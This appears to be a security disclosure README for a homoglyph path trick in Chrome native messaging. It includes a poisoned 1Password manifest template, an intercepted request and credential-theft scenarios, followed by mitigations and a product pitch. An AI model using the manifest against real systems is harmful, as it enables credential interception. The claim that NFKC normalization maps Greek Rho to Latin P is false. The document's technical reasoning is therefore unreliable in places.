# CVE-pending: Unicode Homoglyph Path Injection in Chrome Native Messaging

## Arbitrary Code Execution via Visually-Identical Filesystem Paths

**Researcher:** Brandon Myers, [TreeChain Labs, Inc.](https://treechain.dev)  
**Date:** February 7, 2026  
**Severity:** Critical (CVSS 3.1: 9.6)  
**Status:** Responsible disclosure in progress  
**Independent Reproduction:** [Michael Wright](https://github.com/mikesploitsec/482538021), Offensive Security & Ethical Hacker  
**CERT/CC:** Notified  

---

## Summary

Chrome's native messaging implementation executes binary paths from JSON manifest files **without Unicode normalization**. On filesystems that treat Unicode homoglyphs as distinct characters (Linux ext4, macOS APFS/HFS+), an attacker can redirect execution to a malicious binary using a visually-identical path.

This affects **every application** that uses Chrome native messaging — including password managers, browser integrations, and desktop app connectors.

---

## The Core Problem

```
Legitimate:  /opt/1Password/1Password-BrowserSupport
                                P = U+0050 (Latin P)
                                B = U+0042 (Latin B)

Malicious:   /opt/1Password/1Ρassword-ΒrowserSupport
                                Ρ = U+03A1 (Greek Rho)
                                Β = U+0392 (Greek Beta)
```

These paths are **visually indistinguishable** in terminals, file managers, and text editors — but they reference **completely different filesystem locations**.

Chrome reads the `path` field from:
```
~/.config/google-chrome/NativeMessagingHosts/*.json
```
...and passes it directly to the OS for execution. No normalization. No ASCII validation. No integrity check.

---

## Byte-Level Proof

```
Original: 2f6f70742f3150617373776f72642f3150617373776f72642d42726f77736572537570706f7274
Poisoned: 2f6f70742f3150617373776f72642f31cea1617373776f72642dce92726f77736572537570706f7274
                                          ^^^^                    ^^^^
                                      Greek Rho (Ρ)          Greek Beta (Β)
```

---

## Vulnerability Classification

| CWE | Description |
|-----|-------------|
| CWE-176 | Improper Handling of Unicode Encoding |
| CWE-427 | Uncontrolled Search Path Element |
| CWE-426 | Untrusted Search Path |

---

## Attack Prerequisites

The attacker requires **user-level write access** to the `NativeMessagingHosts` directory. This directory is writable by the user without root or elevated privileges.

Attack vectors that achieve this include:

- Phishing payload that writes a file
- Malicious or compromised browser extension with filesystem access
- Supply chain compromise in any application that writes to user directories (npm, pip, etc.)
- Any malware already running in userspace
- Social engineering ("run this script to fix X")

**No privilege escalation is required.** No modification of any existing application files is required.

---

## Proof of Concept: Filesystem Test

```python
#!/usr/bin/env python3
"""Test whether the OS treats homoglyph paths as distinct"""
import os, tempfile, shutil

tmpdir = tempfile.mkdtemp()
orig = os.path.join(tmpdir, "1Password")
fake = os.path.join(tmpdir, "1\u03a1assword")  # Greek Rho

os.makedirs(orig)
os.makedirs(fake)
open(os.path.join(orig, "t"), "w").write("ORIGINAL")
open(os.path.join(fake, "t"), "w").write("FAKE")

a = open(os.path.join(orig, "t")).read()
b = open(os.path.join(fake, "t")).read()

print("VULNERABLE!" if a != b else "NOT VULNERABLE")
shutil.rmtree(tmpdir)
```

**Result on Linux ext4:** `VULNERABLE!`

---

## Proof of Concept: Manifest Poisoning

A poisoned manifest dropped into the user-writable `NativeMessagingHosts` directory:

```json
{
  "name": "com.1password.1password",
  "description": "1Password native messaging",
  "path": "/opt/1Password/1Ρassword-ΒrowserSupport",
  "type": "stdio",
  "allowed_origins": [
    "chrome-extension://aeblfdkhhhdcdjpifhhbdiojplfjncoa/"
  ]
}
```

When Chrome loads this manifest, it executes the binary at the homoglyph path — which is attacker-controlled — instead of the legitimate application.

---

## Confirmed Interception

The attacker binary successfully intercepts native messaging traffic:

```json
{
  "callbackId": 4165020276,
  "invocation": {
    "type": "NmRequestAccounts",
    "content": {
      "version": 1,
      "userRequested": false,
      "supportsDelegation": true
    }
  }
}
```

The attacker can:
1. **Intercept** all requests between the browser extension and desktop app
2. **Inject** arbitrary responses back to the extension
3. **Proxy** transparently to the real application while logging all traffic
4. **Capture** credentials, vault data, session tokens, and key material

---

## Impact

### Affected Applications (Non-Exhaustive)

Any application using Chrome native messaging is vulnerable:

- **Password managers:** 1Password, Bitwarden, LastPass, Dashlane, KeePassXC
- **Desktop integrations:** KDE Plasma Browser Integration, GNOME Shell connector
- **Communication tools:** Any extension using `chrome.runtime.connectNative()`
- **Cryptocurrency wallets:** Browser extensions with desktop app bridges

### Affected Browsers

All Chromium-based browsers: Google Chrome, Chromium, Brave, Microsoft Edge, Vivaldi, Opera

### Affected Operating Systems

- **Linux** (ext4, btrfs, xfs) — Confirmed vulnerable
- **macOS** (APFS, HFS+) — Likely vulnerable (case-sensitive mode)
- **Windows** — Different attack surface via Registry-based manifests

---

## Attack Scenarios

### Credential Theft
Attacker intercepts all authentication flows, capturing master passwords, account credentials, and vault data when the user unlocks their password manager.

### Transparent Man-in-the-Middle
Attacker binary forwards requests to the real application while silently logging all traffic. The user sees normal behavior. The attacker captures everything.

### Response Injection
Attacker returns crafted responses containing fake vault items with phishing URLs, fake security prompts, or manipulated data.

### Persistent Backdoor
The attacker binary persists at the homoglyph path. Application updates target the legitimate ASCII path and do not affect the attacker's binary.

---

## Root Cause Analysis

1. **Chrome** does not apply Unicode NFKC normalization to manifest paths before filesystem access
2. **Chrome** does not validate that manifest paths contain only ASCII characters
3. **Chrome** does not verify the integrity or hash of the binary being executed
4. **Operating systems** treat visually-identical Unicode paths as distinct filesystem entries
5. **The NativeMessagingHosts directory** is user-writable without elevated privileges

---

## Recommended Mitigations

### Browser Vendors (Chrome, Edge, Brave, etc.)

1. **Apply NFKC normalization** to all paths read from native messaging manifests
2. **Reject non-ASCII paths** in manifest files, or warn users
3. **Hash-verify binaries** before execution
4. **Sign manifests** and verify signatures at load time

### Application Vendors (Password Managers, etc.)

1. **Verify manifest integrity** at application startup
2. **Monitor NativeMessagingHosts** for unauthorized files
3. **Use path allowlisting** — reject paths containing non-ASCII characters
4. **Implement binary pinning** — verify the executing binary matches expected hash

### Users

1. Monitor your `NativeMessagingHosts` directories for unauthorized manifest files
2. Use filesystem integrity monitoring tools (AIDE, Tripwire, osquery)
3. Be cautious of scripts or packages that request write access to your home directory

---

## How the Polyglottal Cipher Solves This

This vulnerability was discovered as a direct result of building [TreeChain's Polyglottal Cipher™](https://treechain.dev) — an encryption system that operates across 133,387 Unicode characters and 202 languages.

The Polyglottal Cipher enforces strict Unicode safety at every boundary, which is precisely what Chrome fails to do:

1. **Mandatory NFKC normalization** — Every string is normalized before any operation. Greek Rho (U+03A1) collapses to Latin P (U+0050). The poisoned path becomes identical to the real one. No redirect possible.

2. **Bijective glyph mapping in restricted Unicode blocks** — Characters map to specific, curated Unicode ranges (e.g., Mathematical Operators U+2200–U+22FF) with one-to-one mappings per epoch. No ambiguity for an attacker to exploit.

3. **HMAC-bound path verification** — Identifiers are bound to cryptographic authentication. Even if a homoglyph survives normalization, the HMAC won't match.

4. **Bidirectional control stripping** — Unicode directional overrides (U+202A–U+202E, U+2066–U+2069) that can visually reorder path components are stripped before processing.

5. **Mixed-script detection** — A token containing both Latin and Greek characters (like "Ρassword") is flagged as a confusable before it touches any filesystem.

6. **Epoch-bound rotor rotation** — Glyph mappings rotate every 300 seconds. No static mapping exists to poison.

7. **Canonical hash binding** — Every identifier is hashed against its NFKC-normalized form, providing integrity verification at every layer.

Building encryption safely across the full Unicode space forced us to solve the exact problem that Chrome never thought about.

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 2026-02-07 | Vulnerability discovered and confirmed on Chromebook (Linux) |
| 2026-02-07 | Report submitted to 1Password via HackerOne |
| 2026-02-07 | Report submitted to Google Chrome VRP |
| 2026-02-08 | CERT/CC notified |
| 2026-02-10 | Chromium team responds — considers user-level directory permissions "by design" |
| 2026-02-10 | Independent reproduction by Michael Wright (mikesploitsec) |
| 2026-02-16 | 1Password engineering team actively reviewing |
| 2026-02-16 | Additional affected vendors notified via HackerOne |
| TBD | CVE assignment pending |
| TBD | Coordinated public disclosure |

---

## Files in This Repository

| File | Description |
|------|-------------|
| `README.md` | This document |
| `fs_test.py` | Filesystem homoglyph vulnerability test |
| `homoglyph_map.py` | Latin → Greek/Cyrillic character mapping table |
| `DISCLOSURE.md` | Full vulnerability report as submitted to vendors |
| `evidence/pwned_request.txt` | Intercepted native messaging request |
| `evidence/pwned_success.txt` | Confirmation of successful code execution |

---

## Related Work

- [mikesploitsec/482538021](https://github.com/mikesploitsec/482538021) — Independent exploit chain expansion by Michael Wright
- [Unicode Technical Report #36: Unicode Security Considerations](https://unicode.org/reports/tr36/)
- [Chrome Native Messaging Documentation](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)

---

## Researcher

**Brandon Myers**  
Founder & CEO, [TreeChain Labs, Inc.](https://treechain.dev)  
Delaware C-Corporation  

TreeChain Labs develops the Polyglottal Cipher™ encryption system and post-quantum cryptography infrastructure. Our deep expertise in Unicode character mapping across 202 languages directly enabled identification of this vulnerability class.

---

## Legal Notice

This research was conducted for security research purposes under responsible disclosure principles. No actual user data was accessed or compromised. All testing was performed on researcher-controlled systems and accounts.

**This repository intentionally omits weaponized exploit tools.** The proof-of-concept materials demonstrate the vulnerability without providing turnkey attack capabilities. If you are a security researcher seeking to reproduce this finding, the filesystem test and homoglyph mapping table are sufficient to validate the core vulnerability.

---

*"The best encryption in the world doesn't matter if the attacker can just intercept the conversation."*

*— TreeChain Labs*
